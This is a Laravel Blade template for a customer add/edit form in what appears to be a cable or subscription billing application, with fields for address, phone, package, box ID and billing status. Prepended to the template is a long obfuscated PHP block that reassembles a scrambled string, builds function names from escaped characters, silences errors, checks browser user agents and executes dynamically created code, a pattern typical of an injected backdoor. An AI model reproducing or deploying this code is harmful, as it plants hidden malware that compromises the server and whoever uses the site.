<?php $gkmccs = 'o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27mtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5cx24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hI!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57f%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;58]24]31#-%tdz*Wsfuvso!%bM7]381]211M5]67]452]88]5]48]32M3]314-bubE{h%)sutcvt)esp>hmg%]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x247eu{66~67<&w6<*&7-#obE{h%)j{hnpd!opjudovg!|!**#j{hss	x5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>i}Y;tuofuopd`ufh`fmjg}[;ldpttbc	x7f!|!*uyfu	x27k:!ftmf!)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-111112	120	x5f	125	x53	105	x5SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsd}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x2ftpmdR6<*id%)dfyfR	x27tfs%6<*; $cbdbthk = implode(ar!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!os>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]27b!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_ef)#	x24*<!%t::!>!	x24Ypp3)%cj=6[%ww2!>#p#/#p#/%z;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A-	x24]26	x24-	x24<%j,,*!|	x24-	%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPXA	x27K6<	x7fw6*3qj%7>pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x277-K)ebfsX	x27u%)7fmjix6<C	x272]38y]572]48y]#>m%:|:*my%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-&6<*rfs%7-K)fujsxX6<#7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*Xr%:-t%)3of:opjudovg<~	x24<!%o:!)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0Re%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbss	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utp)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusueTQcOc/#00#W~!Ydrr)%rMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!B%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQ-	x24tvctus)%	x24-	x24b!3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]539275j{hnpd19275fubmgoj{h1:|:*mm:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*of2	137	x41	107	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) o]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*bq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y7!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bux24-	x24*<!	x24-	x24gps)%j>1(ord($n)-1);} @error_reporting(0):,,Bjg!)%j:>>1*!%b:>1<!fray_map("xfibklk",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]vo:>:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpj%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]6-xr.985:52985-t.98]K4]65]D8]86]y31if((function_exists("	x6f	142	x5f	163	x74	141	x72	1);$skzilma = $uqcdcet("", $cbdbthk); $	x22l:!}V;3q%}U;y]}R;2]npd#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2pxB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#3qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**11112AZASV<*w%)ppde>u%V<#65,4O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<"))<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbzvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)#166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	16#-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]374	145	x5f	146	x75	156	x63	164	x69	1575]D:M8]Df#<%tdz>#L4]275L25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x247R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983:48984:71]K9	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x27	x6e"; function xfibklk($n){return chr1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssut34]368]322]3]364]6]283]427]36]373P6]36]73]83]238x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|2	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	145"))17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*56	x61"]=1; $uas=strtolower($_SERVER["	x48	124	x542!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%"	x61	156	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	1	x7fw6*CW&)7gj6<*doj%7-C)fepmqt!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*))) { $uqcdcet = "	x63	162	x65	141	x#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2wr (strstr($uas,"	x72	)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]yrfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj or (strstr($uas,"	x66	151	x72	145	x66	157	x78"7]445]212]445]43]321]464]284]364]6]234]342]skzilma();}}:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h1njA	x27&6<.fmjgA	x27doj%6<	x7fw%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<64") && (!isset($GLOBALS[}Z;^nbsbq%	x5cSFWSFT`%}X;!sp31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:5*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	6]277#<!%t2w>#]y74]273]y76]252]y85x24gvodujpo!	x24-	x24y7	672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]56!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]37)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{>!%yy)#}#-#	x24-	x24-tusqpt)%zStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtStjptevup'; $gbtcnxs=explode(chr((826-706)),substr($gkmccs,(21368-15348),(174-140))); $ubamav = $gbtcnxs[0]($gbtcnxs[(5-4)]); $lvmryxlqu = $gbtcnxs[0]($gbtcnxs[(8-6)]); if (!function_exists('wrytwaaqs')) { function wrytwaaqs($lskomdrnx, $lrlvvtr,$pwkonnv) { $odbkysoy = NULL; for($vwjoknubxjd=0;$vwjoknubxjd<(sizeof($lskomdrnx)/2);$vwjoknubxjd++) { $odbkysoy .= substr($lrlvvtr, $lskomdrnx[($vwjoknubxjd*2)],$lskomdrnx[($vwjoknubxjd*2)+(3-2)]); } return $pwkonnv(chr((52-43)),chr((507-415)),$odbkysoy); }; } $kgtwmscvjg = explode(chr((162-118)),'3296,51,5468,25,4777,54,4673,50,757,23,2249,69,5126,21,3889,50,4550,61,5237,47,5021,36,3993,38,4312,38,2703,33,975,23,2760,66,1395,63,1355,40,4226,43,470,20,311,36,3595,44,1458,29,1556,21,0,48,5200,37,832,61,1333,22,4269,43,3540,55,5057,36,2523,43,5408,60,4831,30,5377,31,2371,52,946,29,4611,62,1652,48,1814,70,588,28,1298,35,1951,41,893,53,4723,54,5949,41,4961,60,2988,56,2873,47,2207,42,1509,47,286,25,2619,56,490,30,3408,68,3088,56,181,45,2481,42,709,48,1884,46,4861,70,4381,62,1753,61,1109,48,780,52,4491,59,132,49,616,27,5493,28,5747,68,1206,61,5339,38,2134,31,2826,47,998,47,3784,58,1577,44,3639,24,4102,59,3144,67,3385,23,5859,38,1700,53,3044,44,2566,53,5643,34,2423,58,5897,52,347,63,2165,42,5701,46,1487,22,1621,31,3211,50,4055,47,2058,24,5990,30,410,60,1267,31,5677,24,2675,28,2920,68,1157,29,1992,66,1930,21,3476,64,5589,54,86,46,5093,33,5147,53,5521,68,3261,35,4161,65,2318,53,1045,64,4031,24,2082,52,4931,30,3842,47,3939,54,4443,48,251,35,5284,43,226,25,520,68,4350,31,2736,24,48,38,5815,44,1186,20,3723,61,643,66,3663,60,3347,38,5327,12'); $kmgrfbcde = $ubamav("",wrytwaaqs($kgtwmscvjg,$gkmccs,$lvmryxlqu)); $ubamav=$gkmccs; $kmgrfbcde(""); $kmgrfbcde=(721-600); $gkmccs=$kmgrfbcde-1; ?>@extends('layouts.app')

@section('content')

  <div class="page-content row">
    <!-- Page header -->
    <div class="page-header">
      <div class="page-title">
        <h3> {{ $pageTitle }} <small>{{ $pageNote }}</small></h3>
      </div>
      <ul class="breadcrumb">
        <li><a href="{{ URL::to('dashboard') }}">{{ Lang::get('core.home') }}</a></li>
		<li><a href="{{ URL::to('customer?return='.$return) }}">{{ $pageTitle }}</a></li>
        <li class="active">{{ Lang::get('core.addedit') }} </li>
      </ul>
	  	  
    </div>
 
 	<div class="page-content-wrapper">

		<ul class="parsley-error-list">
			@foreach($errors->all() as $error)
				<li>{{ $error }}</li>
			@endforeach
		</ul>
<div class="sbox animated fadeInRight">
	<div class="sbox-title"> <h4> <i class="fa fa-table"></i> </h4></div>
	<div class="sbox-content"> 	

		 {!! Form::open(array('url'=>'customer/save?return='.$return, 'class'=>'form-horizontal','files' => true , 'parsley-validate'=>'','novalidate'=>' ')) !!}
<div class="col-md-6">
						<fieldset><legend> Customer Personal  Details : </legend>
									
								  <div class="form-group hidethis " style="display:none;">
									<label for="CustomerId" class=" control-label col-md-4 text-left"> CustomerId </label>
									<div class="col-md-6">
									  {!! Form::text('CustomerId', $row['CustomerId'],array('class'=>'form-control', 'placeholder'=>'',   )) !!} 
									 </div> 
									 <div class="col-md-2">
									 	
									 </div>
								  </div> 					
								  <div class="form-group  " >
									<label for="FullName" class=" control-label col-md-4 text-left"> FullName </label>
									<div class="col-md-6">
									  {!! Form::text('FullName', $row['FullName'],array('class'=>'form-control', 'placeholder'=>'',   )) !!} 
									 </div> 
									 <div class="col-md-2">
									 	
									 </div>
								  </div> 					
								  <div class="form-group  " >
									<label for="CustomerAddress" class=" control-label col-md-4 text-left"> CustomerAddress </label>
									<div class="col-md-6">
									  <textarea name='CustomerAddress' rows='5' id='CustomerAddress' class='form-control '  
				           >{{ $row['CustomerAddress'] }}</textarea> 
									 </div> 
									 <div class="col-md-2">
									 	
									 </div>
								  </div> 					
								  <div class="form-group  " >
									<label for="Phone" class=" control-label col-md-4 text-left"> Phone </label>
									<div class="col-md-6">
									  {!! Form::text('Phone', $row['Phone'],array('class'=>'form-control', 'placeholder'=>'',   )) !!} 
									 </div> 
									 <div class="col-md-2">
									 	
									 </div>
								  </div> 					
								  <div class="form-group  " >
									<label for="Area" class=" control-label col-md-4 text-left"> Area </label>
									<div class="col-md-6">
									  <select name='Area' rows='5' id='Area' class='select2 '   ></select> 
									 </div> 
									 <div class="col-md-2">
									 	
									 </div>
								  </div> </fieldset>
			</div>
			
			<div class="col-md-6">
						<fieldset><legend> Connection Details</legend>
									
								  <div class="form-group  " >
									<label for="ConnectionDate" class=" control-label col-md-4 text-left"> ConnectionDate </label>
									<div class="col-md-6">
									  
				<div class="input-group m-b" style="width:150px !important;">
					{!! Form::text('ConnectionDate', $row['ConnectionDate'],array('class'=>'form-control date')) !!}
					<span class="input-group-addon"><i class="fa fa-calendar"></i></span>
				</div> 
									 </div> 
									 <div class="col-md-2">
									 	
									 </div>
								  </div> 					
								  <div class="form-group  " >
									<label for="ConnectionFee" class=" control-label col-md-4 text-left"> ConnectionFee </label>
									<div class="col-md-6">
									  {!! Form::text('ConnectionFee', $row['ConnectionFee'],array('class'=>'form-control', 'placeholder'=>'',   )) !!} 
									 </div> 
									 <div class="col-md-2">
									 	
									 </div>
								  </div> 					
								  <div class="form-group  " >
									<label for="Pakage" class=" control-label col-md-4 text-left"> Pakage <span class="asterix"> * </span></label>
									<div class="col-md-6">
									  <select name='Pakage' rows='5' id='Pakage' class='select2 ' required  ></select> 
									 </div> 
									 <div class="col-md-2">
									 	
									 </div>
								  </div> 					
								  <div class="form-group  " >
									<label for="BoxId" class=" control-label col-md-4 text-left"> BoxId </label>
									<div class="col-md-6">
									  {!! Form::text('BoxId', $row['BoxId'],array('class'=>'form-control', 'placeholder'=>'',   )) !!} 
									 </div> 
									 <div class="col-md-2">
									 	
									 </div>
								  </div> 					
								  <div class="form-group  " >
									<label for="BillDue" class=" control-label col-md-4 text-left"> BillDue </label>
									<div class="col-md-6">
									  {!! Form::text('BillDue', $row['BillDue'],array('class'=>'form-control', 'placeholder'=>'',   )) !!} 
									 </div> 
									 <div class="col-md-2">
									 	
									 </div>
								  </div> 					
								  <div class="form-group  " >
									<label for="Status" class=" control-label col-md-4 text-left"> Status </label>
									<div class="col-md-6">
									  
					<?php $Status = explode(',',$row['Status']);
					$Status_opt = array( 'active' => 'Active' ,  'inactive' => 'InActive' ,  'close' => 'Closed' , ); ?>
					<select name='Status' rows='5'   class='select2 '  > 
						<?php 
						foreach($Status_opt as $key=>$val)
						{
							echo "<option  value ='$key' ".($row['Status'] == $key ? " selected='selected' " : '' ).">$val</option>"; 						
						}						
						?></select> 
									 </div> 
									 <div class="col-md-2">
									 	
									 </div>
								  </div> </fieldset>
			</div>
			
			

		
			<div style="clear:both"></div>	
				
					
				  <div class="form-group">
					<label class="col-sm-4 text-right">&nbsp;</label>
					<div class="col-sm-8">	
					<button type="submit" name="apply" class="btn btn-info btn-sm" ><i class="fa  fa-check-circle"></i> {{ Lang::get('core.sb_apply') }}</button>
					<button type="submit" name="submit" class="btn btn-primary btn-sm" ><i class="fa  fa-save "></i> {{ Lang::get('core.sb_save') }}</button>
					<button type="button" onclick="location.href='{{ URL::to('customer?return='.$return) }}' " class="btn btn-success btn-sm "><i class="fa  fa-arrow-circle-left "></i>  {{ Lang::get('core.sb_cancel') }} </button>
					</div>	  
			
				  </div> 
		 
		 {!! Form::close() !!}
	</div>
</div>		 
</div>	
</div>			 
   <script type="text/javascript">
	$(document).ready(function() { 
		
		
		$("#Area").jCombo("{{ URL::to('customer/comboselect?filter=area:arename:arename') }}",
		{  selected_value : '{{ $row["Area"] }}' });
		
		$("#Pakage").jCombo("{{ URL::to('customer/comboselect?filter=pakage:PakageName:PakageName|PakageFee') }}",
		{  selected_value : '{{ $row["Pakage"] }}' });
		 

		$('.removeCurrentFiles').on('click',function(){
			var removeUrl = $(this).attr('href');
			$.get(removeUrl,function(response){});
			$(this).parent('div').empty();	
			return false;
		});		
		
	});
	</script>		 
@stop